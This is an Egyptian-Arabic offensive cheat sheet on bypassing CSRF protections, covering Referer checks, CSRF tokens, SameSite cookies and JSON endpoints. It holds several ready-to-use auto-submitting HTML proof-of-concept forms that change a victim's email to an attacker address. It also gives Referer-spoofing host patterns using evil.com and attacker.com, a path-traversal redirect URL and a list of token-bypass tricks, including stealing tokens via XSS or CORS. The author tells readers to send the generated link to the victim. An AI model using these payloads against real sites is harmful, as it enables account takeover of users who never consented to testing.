# *التحايل المتقدم على CSRF*

🔹 لما تحاول *تحديث حاجة في الموقع،* ممكن تستغل ده لعمل *هجوم CSRF* باستخدام Burp Suite:
1. افتح *Burp Suite* ➝ *Engagement Tools* ➝ *Create CSRF PoC*.
2. خد اللينك الناتج وابعته للضحية.

🔹 *لما الضحية يضغط على اللينك، التحديث اللي انت عملته بيتنفذ عليه بشكل تلقائي.*

🔹 *لكن المشكلة:* لو لقينا إن الموقع عنده *حماية عبر CSRF Token* بتحاول تمنع الهجوم.

🔹 *الحل:* لازم نلاقي *طريقة للتحايل على CSRF Token بأي وسيلة!* 

---


## *🔹 الحواجز اللي ممكن تمنعك من اختبار ثغرات CSRF:*

1️⃣ *الـ Referrer* ➝ بعض المواقع بتتحقق من مصدر الطلب لمنع الهجمات الخارجية.

2️⃣ *CSRF Token* ➝ مواقع بتستخدم توكنات ديناميكية لكل طلب عشان تتحقق منه.

3️⃣ *SameSite Cookies* ➝ الكوكيز اللي بيتم تقييدها بحيث متتبعثش مع الطلبات الخارجية.

4️⃣ *JSON Format* ➝ بعض التطبيقات بتطلب بيانات بصيغة JSON، وده بيصعب تنفيذ CSRF بالطريقة التقليدية.

---
## *🔹 التحايل على Referrer في CSRF Bypass*

✅ **لو الموقع بيتحقق من Referrer كويس، فيه طريقتين ممكن تستخدمهم:**
1. **إزالة Referrer Header من الطلب.**
2. **تعديل Referrer ليكون بالشكل:**
   ```
   https://attacker.com/https://victim.com
   ```

🔹 *لكن السؤال هنا:* إزاي ممكن تحط Referrer المطلوب جوا HTML PoC؟ 🤔
---
```
<html>
<head><meta name="referrer" content="unsafe-url"></head>
<body>
<script>history.pushState('', '', '/')</script>
<form name="hacker" method="POST" action="https://account.example.com/change_email">
    <input type="hidden" name="email" value="hossamshady24@gmail.com">
</form>
<script>
    document.forms[0].submit();
</script>
</body>
</html>
```

---

## *طرق التحايل على Referrer*

ممكن تقدر تتجاوز فحص Referrer باستخدام واحدة من الطرق دي:

- evil.com/account.example.com
- account.exampleevil.com
- evil.com#account.example.com
- evil.com/file@example.com   ---> *دي الأكتر استخدامًا*

---
---

## *🔹 التحايل على JSON Format في CSRF*

🔹 *لو لازم تضيف بيانات بصيغة JSON جوا PoC، فيه طريقة تقدر تستخدمها:*

✅ **بدل ما تبعت Content-Type: application/json، استخدم Content-Type: text/plain!**

🔹 *كود استغلال PoC:*
```
html
<form name="hacker" method="POST" action="https://example.com/phone.json" enctype="text/plain">
    <input type="hidden" name='{"new_email":"attacker@example.com"}'>
</form>
<script>
    document.forms[0].submit();
</script>
```

🔹 *الفرق في الطلبات:*

- *الطلب العادي:*
  
```
  POST /api/profile/update HTTP/2
  Host: app.example.com
  Content-Type: application/json
  {
      "new_email": "user@example.com"
  }
  ```
- **الهجوم باستخدام text/plain:**
  
```
  POST /api/profile/update HTTP/2
  Host: app.example.com
  Content-Type: text/plain
  {"new_email":"attacker@example.com"}
  ```

✅ *كده السيرفر هيقرا البيانات عادي وCSRF هيشتغل!* 🚀🔥
---
� **لما تبعت طلب بـ Referrer غير متوافق مع الموقع، ممكن يرد عليك بـ 400 Bad Request!** 😵

🔹 **مثال لطلب فشل بسبب Referrer مش مقبول:**
```
http
POST /api/profile/update HTTP/2
Host: app.example.com
Content-Type: application/x-www-form-urlencoded
Referer: https://attacker.com/poc

new_email=attacker%40example.com
```
🔹 **السيرفر هيرد بـ HTTP/2 400 Bad Request وبالتالي الهجوم هيفشل.** ❌

---

## *🔹 التحايل على Referrer عشان ينجح الهجوم*

🔹 **لو السيرفر بيتحقق من الـ Referrer بطريقة ضعيفة، ممكن تستخدم حيلة عشان تخليه يقبله.** 😏

✅ **تعديل Referrer عشان يحتوي على رابط الضحية داخل رابط الهجوم نفسه!**

🔹 *مثال لطلب معدل نجح في تجاوز الفحص:*
```
http
POST /api/profile/update HTTP/2
Host: app.example.com
Content-Type: application/x-www-form-urlencoded
Referer: https://attacker.com/poc?app.example.com

new_email=attacker%40example.com
```

🔹 **السيرفر هيرد بـ HTTP/2 200 OK وكده الهجوم نجح!** ✅🔥

---
## *🔹 تجاوز حماية SameSite Strict Cookie*

🔹 *حماية SameSite=Strict بتمنع إرسال الكوكيز مع الطلبات القادمة من مواقع خارجية.*
🔹 *الحل؟* لازم تلاقي *ثغرة إعادة توجيه (Open Redirect) أو Path Traversal داخل نفس الموقع.*

✅ *مثال لو عندك رابط تغيير البريد الإلكتروني:*

```
https://example.com/change_email
```
🔹 *والموقع بيمنعك من تغييره بسبب سياسة SameSite* ❌

✅ *الحل: دور على صفحات داخل الموقع فيها Path Traversal أو Open Redirect.*

🔹 *مثال لكود جافاسكريبت ممكن يساعدك في كشف Path Traversal:*
```
javascript
redirectOnConfirmation = (blogPath) => {
    setTimeout(() => {
        const url = new URL(window.location);
        const postId = url.searchParams.get("postId");
        window.location = blogPath + '/' + postId;
    }, 3000);
}
```
🔹 **لو التطبيق عنده ضعف في التعامل مع المتغيرات في الرابط (postId)، ممكن تستخدمه في الهجوم.**

✅ *مثال لاستغلال Path Traversal في CSRF:*
```
https://example.com?postID=hossam/../../../../change_email
```

🔹 **بمجرد ما الموقع يعالج postID بدون فحص، هيتم توجيه الطلب إلى /change_email داخل نفس الموقع.**
✅ *كده الهجوم هيشتغل رغم الحماية!* 🔥🚀

---
## **تجاوز حماية SameSite Lax بالمصري**

🔹 **حماية SameSite Lax** بتمنع إرسال الكوكيز مع الطلبات اللي جاية من مواقع خارجية، لكنها ممكن تتجاوز في حالتين بس:

1️⃣ **لو الطلب من نوع GET.**

2️⃣ **لو المستخدم ضغط بنفسه على اللينك اللي بيعمل الطلب.**

✅ **مثال على استغلال الحماية دي:**
```http
GET /my-account/change-email?email=asd%40asd.asd HTTP/1.1
Host: example.com
Cookie: session=ualJ1PbUNh0Uhq3MEt4cTP7sZZ1svF4w
```
🔹 **لكن المشكلة:** بعض السيرفرات بتمنع استخدام `GET` مع عمليات حساسة وبترد بـ `405 Method Not Allowed`. ❌

---

## **🔹 الحل: تحويل الطلب إلى POST بأي طريقة!**

🔹 **لو السيرفر مش بيقبل `GET`، ممكن نحاول نخليه يقبل `POST` عن طريق تعديل الطلب بإضافة `method=POST` في الـ POC.**

✅ **مثال على استغلال بسيط بالكود:**
```html
<script>
    document.location = "https://example.com/my-account/change-email?email=hacker@example.com&_method=POST";
</script>
```
🔹 **كده السيرفر ممكن يعالج الطلب كأنه `POST`، ويقبل تنفيذ الهجوم!** 🚀🔥

✅ **النقطة المهمة:** لازم السيرفر يكون عنده ضعف في معالجة الطرق (`HTTP Methods`) عشان الطريقة دي تشتغل.

🔹 **بكده نقدر نتجاوز SameSite Lax رغم القيود الأمنية الموجودة.** 🔥

---

## **تجاوز JSON Parameters و Referrer Header بالمصري**

🔹 **لما بتبعت بيانات JSON، أحيانًا بيكون في مشكلة مع القيم الفارغة أو الغير مقبولة في الطلب.**

✅ **مثال على الـ JSON العادي اللي ممكن نحتاج نعدّل فيه:**
```json
{"username":"shadyhacker"}
```
🔹 **لكن لو حبينا نحذف `=` في النهاية، ممكن نستخدم تريك بسيط!**

✅ **إضافة بارامتر جديد باسم `a` وتحط القيمة `}` جواه، فالناتج يكون:**
```json
{"username":"shadyhacker", "a":"="}
```
🔹 **السيرفر هيتعامل مع الطلب بالشكل ده بدون مشاكل، واحتمال يحصل تجاوز للحماية!** 🔥

---

## **🔹 حذف Referrer Header عشان الهجوم يشتغل**

🔹 بعض المطورين بيظنوا إن أي طلب لازم يكون فيه `Referrer Header`، وده ممكن يمنع تنفيذ بعض الهجمات.
🔹 **لكن ممكن نخدع النظام ونمنع إرسال الهيدر ده باستخدام `meta no-referrer`.**

✅ **مثال بسيط لإلغاء الـ Referrer:**
```html
<meta name="referrer" content="no-referrer">
```
🔹 **كده المتصفح مش هيبعت `Referrer Header`، فالهجوم ممكن يتم بدون مشاكل!** 😈

---

## **🔹 استغلال CSRF Bypass باستخدام No-Referrer**

✅ **كود HTML بسيط ينفذ هجوم CSRF بدون Referrer:**
```html
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <!-- منع إرسال Referrer Header -->
    <meta name="referrer" content="no-referrer">
</head>
<body>
    <form action="https://app.example.com/api/profile/update" method="POST">
        <input type="hidden" name="new_email" value="attacker@example.com">
        <input type="submit" value="Submit request">
    </form>
    <script>
        history.pushState('', '', '/');
        document.forms[0].submit();
    </script>
</body>
</html>
```
🔹 **بكده، الطلب هيتبعت بدون Referrer، ولو الموقع بيعتمد عليه كحماية، فالهجوم هينجح!** 🚀🔥

---
## **تجاوز CSRF Token و Referrer بالمصري**

🔹 **التحايل على Referrer باستخدام Unsafe-URL**

✅ **استخدام `<meta name="referrer" content="unsafe-url">` بيخلي المتصفح يبعت الـ Referrer حتى لو كان الرابط غير آمن.**
```html
<meta name="referrer" content="unsafe-url" />
```
🔹 **ده ممكن يسرّب بيانات حساسة في الـ URL للطلبات غير الآمنة (HTTP).**

---

## **🔹 طرق تجاوز CSRF Token**

✅ **1. حذف التوكن بالكامل أو إزالة قيمته.**

✅ **2. استخدام توكن بنفس الطول ولكن عشوائي.**

✅ **3. تجربة تغيير طول التوكن (ناقص 1 أو زائد 1).**

✅ **4. إدخال توكن المهاجم بدل الضحية.**

✅ **5. تحويل الطلب من `POST` إلى `GET` وإزالة التوكن.**

✅ **6. لو الطلب `PUT` أو `DELETE`، جرب `POST`.**

✅ **7. لو التوكن في `Custom Header`، جرب إزالته.**

---

## **🔹 تجاوز حماية Content-Type**

✅ **8. تغيير الـ Content-Type إلى: `application/json`, `application/x-www-form-urlencoded`, `form-data`, `text/plain`, `application/xml`.**

✅ **9. لو فيه Double Submit Token في الكوكيز والهيدر، جرب تنفيذ CRLF Injection.**

✅ **10. تجاوز فحص الـ Referrer باستخدام:**

```html
<meta name="referrer" content="never">
```

---

## **🔹 طرق أخرى للتحايل على CSRF Token**

✅ **11. سرقة الـ CSRF Token باستخدام XSS أو CORS.**

✅ **12. تغيير الـ Content-Type وتجربة Flash + 307 Redirect.**

✅ **13. تجربة تخمين التوكن لو فيه جزء ثابت.**

✅ **14. استخدام Clickjacking لتنفيذ الهجوم رغم الحماية.**

✅ **15. استغلال Type Juggling لو التطبيق بيستخدم PHP ويقبل القيم بشكل غير صحيح.**

✅ **16. تجربة إرسال التوكن في Array زي كده:**
```http
newemail=victim@gmail.com&csrftoken[]=lol
```
✅ **17. تعيين التوكن لقيمة `null` أو إضافة Null Bytes.**

✅ **18. التأكد من إن التوكن مش بيتسرب عبر HTTP لمصادر خارجية.**

✅ **19. توليد أكتر من CSRF Token ومراقبة الجزء الثابت فيه، ثم اللعب في الجزء المتغير.**

🔹 **بكده عندك أكتر من طريقة عشان تتجاوز CSRF Token في مواقع مختلفة.** 🚀🔥

